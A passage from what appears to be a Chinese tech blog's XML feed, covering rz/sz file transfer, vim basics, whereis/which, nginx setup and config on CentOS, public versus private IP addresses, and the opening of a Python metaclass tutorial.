src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8727.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rz</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8728.png"></p><blockquote><p>这时候会弹出上传窗口的</p></blockquote><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8729.png"></p><p>选择文件上传就ok了，上传到你当前路径下。 </p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8730.png"></p><h4 id="Note-一种方便的方法"><a href="#Note-一种方便的方法" class="headerlink" title="Note:一种方便的方法"></a>Note:一种方便的方法</h4><p>在windows下使用客户端<code>FileZilla Client</code>,具体的使用如图所示</p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/34.png"></p><p>在服务器再次确认，发现上传成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ktt:~# cd &#x2F;var&#x2F;www&#x2F;</span><br><span class="line">root@ktt:&#x2F;var&#x2F;www# ls</span><br><span class="line">1.html  1.txt  env27  librepaht</span><br><span class="line">root@ktt:&#x2F;var&#x2F;www# </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="文件下载-1"><a href="#文件下载-1" class="headerlink" title="文件下载"></a>文件下载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sz 文件名</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8731.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8732.png"></p><p><img src="/2018/05/13/%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%9F%A5%E8%AF%86/%E5%9B%BE%E7%89%8733.png"></p><blockquote><p>于是windows桌面中就出现了1.txt文件</p></blockquote><h1 id="vim小知识"><a href="#vim小知识" class="headerlink" title="vim小知识"></a><center>vim小知识</center></h1><blockquote><p>1输入内容:<code>insert</code>模式，敲入小写<code>i</code>就会进入insert模式</p><p>2删除.<code>delete</code>键可以删除内容</p><p>3移动：pagedown和pageup可以上下滑动，方向键可以移动光标</p><p>4保存退出：<code>:wq</code>w表示write， q表示quit</p><p>5非保存退出：<code>q!</code></p><p>6删除：连续敲键盘字母<code>d</code>两次，可以删除一行内容</p><p>7搜索：<code>命令模式</code>下，输入<code>/user</code>,<code>/</code>要搜索的字符串或者字符</p><p>8行号：<code>:set number</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 服务器 </tag>
            
            <tag> CentOs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux中查看软件文件安装路径</title>
      <link href="/2018/05/13/linux%E4%B8%AD%E6%9F%A5%E7%9C%8B%E8%BD%AF%E4%BB%B6%E6%96%87%E4%BB%B6%E5%AE%89%E8%A3%85%E8%B7%AF%E5%BE%84/"/>
      <url>/2018/05/13/linux%E4%B8%AD%E6%9F%A5%E7%9C%8B%E8%BD%AF%E4%BB%B6%E6%96%87%E4%BB%B6%E5%AE%89%E8%A3%85%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在linux中文件与软件一般都是安装在到<code>/usr/share</code>和<code>/usr/local</code>中了，如果我们需要查看软件安装路径linux为我们提供了查看命令，<code>whereis</code> 就可以帮我查找文件安 装路径</p></blockquote><a id="more"></a><h1 id="查看软件数据库安装位置"><a href="#查看软件数据库安装位置" class="headerlink" title="查看软件数据库安装位置"></a><center>查看软件数据库安装位置</center></h1><p>如果你想找到nginx文件，输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis nginx</span><br></pre></td></tr></table></figure><p>显示如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx: &#x2F;usr&#x2F;sbin&#x2F;nginx &#x2F;etc&#x2F;nginx &#x2F;usr&#x2F;share&#x2F;nginx &#x2F;usr&#x2F;share&#x2F;man&#x2F;man1&#x2F;nginx.1.gz</span><br></pre></td></tr></table></figure><h1 id="查询运行文件所在路径"><a href="#查询运行文件所在路径" class="headerlink" title="查询运行文件所在路径"></a><center>查询运行文件所在路径</center></h1><p>如果你只要查询文件的运行文件所在地址，直接用下面的命令就可以了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which xxx</span><br></pre></td></tr></table></figure><p>例如我查看我nginx运行文件的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which nginx</span><br></pre></td></tr></table></figure><p>运行如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br></pre></td></tr></table></figure><p><strong>以上只适合安装路径加入PATH里</strong> </p><p>如果是<code>源码</code>安装的话，你可以使用<code>-prefix</code>指定安装路径，这样，你可以很轻松知道软件的安装路径； </p><h1 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h1><p>源码的安装一般由<code>3个步骤</code>组成：配置（<code>configure</code>）、编译（<code>make</code>）、安装（<code>make  install</code>），具体的安装方法一般作者都会给出文档，这里主要讨论配置（configure）。<code>Configure</code>是一个<code>可执行脚本</code>，它有很多选项，使用命令<code>./configure –help</code>输出详细的选项列表.</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> whereis </tag>
            
            <tag> which </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS Nginx的基本操作</title>
      <link href="/2018/05/13/CentOS-Nginx%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2018/05/13/CentOS-Nginx%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a><center>基本操作</center></h1><a id="more"></a><table><thead><tr><th><center>解释</center></th><th><center>命令</center></th></tr></thead><tbody><tr><td><center>安装</center></td><td><center>yum install nginx</center></td></tr><tr><td><center>启动</center></td><td><center>service nginx start</center></td></tr><tr><td><center>停止</center></td><td><center>service nginx stop</center></td></tr><tr><td><center>重载</center></td><td><center>service nginx reload</center></td></tr></tbody></table><p><strong>注意：</strong></p><p>1:使用重载命令的前提：服务已经启动了，如果是 停止了，那么重载是失效的。</p><p>2:reload在运维中非常有用：使用restart命令时，启动会有一段时间。比如是0.5s，那么在这0.5s中用户就无法访问到修改的。相反，reload可以实现无缝连接，用户仍然可以访问到</p><p><img src="/2018/05/13/CentOS-Nginx%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%871.png"></p><p>发现有问题：</p><p><strong>解决方法</strong></p><blockquote><p>1：添加CentOS7 Nginx yum资源库:</p><p>2： sudo rpm -Uvh </p><p><a href="http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.ol7.ngx.noarch.rpm">http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</a>  #这个链接是跟在sudo rpm -Uvh 后面的</p><p>3：sudo yum install -y nginx</p></blockquote><h2 id="查看nginx服务及启动nginx"><a href="#查看nginx服务及启动nginx" class="headerlink" title="查看nginx服务及启动nginx"></a>查看nginx服务及启动nginx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br><span class="line">sudo service nginx start</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/CentOS-Nginx%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/%E5%9B%BE%E7%89%872.png"></p><h1 id="nginx目录文件"><a href="#nginx目录文件" class="headerlink" title="nginx目录文件"></a><center>nginx目录文件</center></h1><p>1:进入文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;nginx</span><br></pre></td></tr></table></figure><p><strong>Note:</strong> 如果忘了安装的路径，可以使用下面的命令进行查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whereis nginx  # 安装路径</span><br><span class="line">或者</span><br><span class="line">which nginx  # 查看运行文件路径</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# tree &#x2F;etc&#x2F;nginx</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;nginx</span><br><span class="line">├── client_body_temp</span><br><span class="line">├── conf                             # Nginx所有配置文件的目录</span><br><span class="line">│   ├── fastcgi.conf                 # fastcgi相关参数的配置文件</span><br><span class="line">│   ├── fastcgi.conf.default         # fastcgi.conf的原始备份文件</span><br><span class="line">│   ├── fastcgi_params               # fastcgi的参数文件</span><br><span class="line">│   ├── fastcgi_params.default       # 所有结尾为default的文件都是备份文件</span><br><span class="line">│   ├── koi-utf</span><br><span class="line">│   ├── koi-win</span><br><span class="line">│   ├── mime.types                   # 媒体类型</span><br><span class="line">│   ├── mime.types.default</span><br><span class="line">│   ├── nginx.conf                   # Nginx主配置文件</span><br><span class="line">│   ├── nginx.conf.default</span><br><span class="line">│   ├── scgi_params                  # scgi相关参数文件</span><br><span class="line">│   ├── scgi_params.default  </span><br><span class="line">│   ├── uwsgi_params                 # uwsgi相关参数文件</span><br><span class="line">│   ├── uwsgi_params.default</span><br><span class="line">│   └── win-utf</span><br><span class="line">├── fastcgi_temp                     # fastcgi临时数据目录</span><br><span class="line">├── html                             # Nginx默认站点目录</span><br><span class="line">│   ├── 50x.html                     # 错误页面优雅替代显示文件，例如当出现502错误时会调用此页面</span><br><span class="line">│   └── index.html                   # 默认的首页文件</span><br><span class="line">├── logs                             # Nginx日志目录</span><br><span class="line">│   ├── access.log                   # 访问日志文件</span><br><span class="line">│   ├── error.log                    # 错误日志文件</span><br><span class="line">│   └── nginx.pid                    # pid文件，Nginx进程启动后，会把所有进程的ID号写到此文件</span><br><span class="line">├── proxy_temp                       # 临时目录</span><br><span class="line">├── sbin                             # Nginx命令目录</span><br><span class="line">│   └── nginx                        # Nginx的启动命令</span><br><span class="line">├── scgi_temp                        # 临时目录</span><br><span class="line">└── uwsgi_temp                       # 临时目录</span><br></pre></td></tr></table></figure><p>打开nginx.conf，展示如下</p><blockquote><p>vim nginx.conf</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">user  nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn;</span><br><span class="line">pid        &#x2F;var&#x2F;run&#x2F;nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class="line">                      &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class="line">                      &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class="line"></span><br><span class="line">    log_format accessimooc &#39;$remote_addr - &quot;$http_user_agent&quot;&#39;;</span><br><span class="line">    access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  accessimooc;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们打开conf.d目录下的default.conf文件去看一下内容</p><blockquote><p>cat default.conf</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    #access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;host.access.log  main;</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              &#x2F;404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page &#x2F;50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">    location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    proxy_pass   http:&#x2F;&#x2F;127.0.0.1;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    root           html;</span><br><span class="line">    #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    #    fastcgi_index  index.php;</span><br><span class="line">    #    fastcgi_param  SCRIPT_FILENAME  &#x2F;scripts$fastcgi_script_name;</span><br><span class="line">    #    include        fastcgi_params;</span><br><span class="line"> #&#125;</span><br><span class="line"></span><br><span class="line">    # deny access to .htaccess files, if Apache&#39;s document root</span><br><span class="line">    # concurs with nginx&#39;s one</span><br><span class="line">    #</span><br><span class="line">    #location ~ &#x2F;\.ht &#123;</span><br><span class="line">    #    deny  all;</span><br><span class="line">    #&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CentOS </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公有ip和私有ip</title>
      <link href="/2018/05/13/%E5%85%AC%E6%9C%89ip%E5%92%8C%E7%A7%81%E6%9C%89ip/"/>
      <url>/2018/05/13/%E5%85%AC%E6%9C%89ip%E5%92%8C%E7%A7%81%E6%9C%89ip/</url>
      
        <content type="html"><![CDATA[<li>IP地址是为了区分网络中不同主机所分配的一个地址，通过IP地址可以访问到每一台主机。</li><a id="more"></a><li>IP地址分为`公有地址`和`私有地址`，公有地址由Internet NIC负责（比如中国互联网信息中心[http://ip.cnnic.cn/](http://link.zhihu.com/?target=http%3A//ip.cnnic.cn/)），`公有IP地址`分配给`注册并向NIC提出申请的组织机构`使用，公有地址IP可以直接访问internet，大家可以打开电脑或者手机的浏览器，登录百度，搜索“IP地址查询”，就可以看到目前电脑正在使用的公有IP地址。`私有地址`主要有`A`、`B`、`C`三类，属于局域网范畴内，也就是所谓的`内网IP`。内网IP只能在**局域网**内被访问，出了局域网是无法访问internet的，安卓4.0以上版本的用户在连上WIFI或者蜂窝数据的情况下，可以打开设定-关于设备-状态中，会看到IP地址为`192.168.x.xxx`或者`10.0.xxx.xxx`，这些IP地址都属于`私有`IP地址。</li><li>`DHCP协议`，即**动态主机配置协议**，会通过**协议算法**分配给一台主机一个IP地址，简单说就是**动态分配**，比如我们的设备连入无线路由器，那么无线路由器通过DHCP协议就会自动给设备分配一个http://192.168.xxx.xxx的私有IP地址。**通过这个私有IP地址，路由器可以在网络层中分辨出谁是谁**。注：这里的网络层说的是OSI七层结构中的网络层。</li><li>`NAT协议` ，也就是**网络地址转换协议**。通过这个协议，我们可以让处于内网中的`多个`设备的**内网IP**对应到`一个`**公有地址IP**上去，从而实现对internet的访问。可以说NAT协议是对目前ipv4地址日渐枯竭起到一个缓解作用。</li><p><strong>接下来就是主题了：</strong></p><li>pv4地址是很有限的，如今家家户户都拥有多台可联网设备，给每台设备都分配一个固定的公有IP地址是很不现实的。因此我们可以采用这样的办法：首先建立一个内网，这个内网可大可小，小的可以是一台我们家里常用的无线路由器所形成的局域网，大了可以是某个片区内的“局域网”（比如多个住宅小区形成的一个内网）。对于这样的内网，我们并不需要分配给其稀缺的公有地址IP，只需要用私有地址IP就行了（比如上面提到的[http://10.0.xxx.xxx](http://link.zhihu.com/?target=http%3A//10.0.xxx.xxx)），而一些网关设备，或者说运营商的设备由于数量并不是太多，因此可以分配一个公网IP地址，然后我们电脑所使用的内网IP地址通过NAT协议套用上一个公网地址IP，这样就可以实现一个稀缺的公网IP地址+多个内网IP地址来访问Internet了。其中DHCP协议则负责内网和公有IP地址的分配。 </li><li>  那么从物理链路拓扑上讲，交换机和路由器又有什么区别的？</li><p>交换机工作于<code>数据链路层</code>，用来隔离冲突域，连接的所有设备同属于一个广播域（子网），负责子网内部通信。<br>路由器工作于<code>网络层</code>，用来隔离广播域（子网），连接的设备分属不同子网，工作范围是多个子网之间，负责网络与网络之间通信。<br>-—————————————————–<br>举个例子：<br>家用宽带路由器，其实是交换机和路由器的结合体，有两个网络层接口，一个连接运营商网络，物理上也就是wan口，IP地址由运营商分配。另一个连接家庭网络，没有物理接口，IP地址由自己通过路由器管理界面配置，一般默认是192.168.1.1<br>那另外几个Lan口干什么用的？这就是交换机接口，和家庭网络接口相连，负责家庭网络内部通信。</p><p>私有网段,有A,B,C三个地址段：</p><p>10.0.0.0–10.255.255.255</p><p>172.16.0.0–172.31.255.255<br>192.168.0.0–192.168.255.255</p><li></li>]]></content>
      
      
      <categories>
          
          <category> IP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python中的元类-MetaClass</title>
      <link href="/2018/05/12/Python%E4%B8%AD%E7%9A%84%E5%85%83%E7%B1%BB-MetaClass/"/>
      <url>/2018/05/12/Python%E4%B8%AD%E7%9A%84%E5%85%83%E7%B1%BB-MetaClass/</url>
      
        <content type="html"><![CDATA[<h1 id="类是对象"><a href="#类是对象" class="headerlink" title="类是对象"></a><center>类是对象</center></h1><a id="more"></a><p>在理解元类之前，你需要先掌握Python中的类。Python中类的概念借鉴于Smalltalk，这显得有些奇特。在大多数编程语言中，类就是一组用来描述如何生成一个对象的代码段。在Python中这一点仍然成立： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class ObjectCreator(object):</span><br><span class="line">…       pass</span><br><span class="line">…</span><br><span class="line">&gt;&gt;&gt; my_object &#x3D; ObjectCreator()</span><br><span class="line">&gt;&gt;&gt; print my_object</span><br><span class="line">&lt;__main__.ObjectCreator object at 0x8974f2c&gt;</span><br></pre></td></tr></table></figure><p>但是，Python中的类还远不止如此。<strong>类同样也是一种对象</strong>。是的，没错，就是对象。只要你使用<strong>关键字</strong><code>class</code>，Python解释器在执行的时候就会创建一个对象。下面的代码段： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class ObjectCreator(object):</span><br><span class="line">…       pass</span><br><span class="line">…</span><br></pre></td></tr></table></figure><p>将在内存中创建一个对象，名字就是ObjectCreator。<strong>这个对象（类）自身拥有创建对象（类实例）的能力，而这就是为什么它是一个类的原因。</strong>但是，它的<strong>本质</strong>仍然是一个<strong>对象</strong>，于是乎你可以对它做如下的操作： </p><blockquote><p><strong>1)</strong>   你可以将它赋值给一个变量</p><p><strong>2)</strong>   你可以拷贝它</p><p><strong>3)</strong>   你可以为它增加属性</p><p><strong>4)</strong>   你可以将它作为函数参数进行传递</p></blockquote><p>下面是示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print ObjectCreator     # 你可以打印一个类，因为它其实也是一个对象</span><br><span class="line">&lt;class &#39;__main__.ObjectCreator&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; def echo(o):</span><br><span class="line">…       print o</span><br><span class="line">…</span><br><span class="line">&gt;&gt;&gt; echo(ObjectCreator)                 # 你可以将类做为参数传给函数</span><br><span class="line">&lt;class &#39;__main__.ObjectCreator&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print hasattr(ObjectCreator, &#39;new_attribute&#39;)</span><br><span class="line">Fasle</span><br><span class="line">&gt;&gt;&gt; ObjectCreator.new_attribute &#x3D; &#39;foo&#39; #  你可以为类增加属性</span><br><span class="line">&gt;&gt;&gt; print hasattr(ObjectCreator, &#39;new_attribute&#39;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; print ObjectCreator.new_attribute</span><br><span class="line">foo</span><br><span class="line">&gt;&gt;&gt; ObjectCreatorMirror &#x3D; ObjectCreator # 你可以将类赋值给一个变量</span><br><span class="line">&gt;&gt;&gt; print ObjectCreatorMirror()</span><br><span class="line">&lt;__main__.ObjectCreator object at 0x8997b4c&gt;</span><br></pre></td></tr></table></figure><p>#<center> 动态地创建类</center></p><p>因为<strong>类也是对象</strong>，你可以在运行时动态的创建它们，就像其他任何对象一样。首先，你可以在<strong>函数中创建类</strong>，使用<code>class</code>关键字即可。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def choose_class(name):</span><br><span class="line">…       if name &#x3D;&#x3D; &#39;foo&#39;:</span><br><span class="line">…           class Foo(object):</span><br><span class="line">…               pass</span><br><span class="line">…           return Foo     # 返回的是类，不是类的实例</span><br><span class="line">…       else:</span><br><span class="line">…           class Bar(object):</span><br><span class="line">…               pass</span><br><span class="line">…           return Bar</span><br><span class="line">…</span><br><span class="line">&gt;&gt;&gt; MyClass &#x3D; choose_class(&#39;foo&#39;)</span><br><span class="line">&gt;&gt;&gt; print MyClass              # 函数返回的是类，不是类的实例</span><br><span class="line">&lt;class &#39;__main__&#39;.Foo&gt;</span><br><span class="line">&gt;&gt;&gt; print MyClass()            # 你可以通过这个类创建类实例，也就是对象</span><br><span class="line">&lt;__main__.Foo object at 0x89c6d4c&gt;</span><br></pre></td></tr></table></figure><p>但这还不够动态，因为你仍然需要自己编写整个类的代码。由于类也是对象，所以它们必须是通过什么东西来生成的才对。当你使用<code>class</code>关键字时，Python解释器<strong>自动创建</strong>这个对象。但就和Python中的大多数事情一样，Python仍然提供给你<strong>手动处理</strong>的方法。还记得<strong>内建函数</strong><code>type</code>吗？这个古老但强大的函数能够让你知道一个对象的类型是什么，就像这样： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print type(1)</span><br><span class="line">&lt;type &#39;int&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print type(&quot;1&quot;)</span><br><span class="line">&lt;type &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print type(ObjectCreator)</span><br><span class="line">&lt;type &#39;type&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print type(ObjectCreator())</span><br><span class="line">&lt;class &#39;__main__.ObjectCreator&#39;&gt;</span><br></pre></td></tr></table></figure><p>这里，<code>type</code>有一种完全不同的能力，它也能<strong>动态</strong>的创建类。<code>type</code>可以<strong>接受一个类的描述作为参数，然后返回一个类</strong>。（我知道，根据传入参数的不同，同一个函数拥有两种完全不同的用法是一件很傻的事情，但这在Python中是为了保持向后兼容性）</p><p>type可以像这样工作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type(name, bases, dict) #类名, 父类的元组（针对继承的情况，可以为空），包含属性的字典（名称和值）</span><br></pre></td></tr></table></figure><p>比如下面的代码： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class MyShinyClass(object):</span><br><span class="line">…       pass</span><br></pre></td></tr></table></figure><p>可以手动像这样创建： 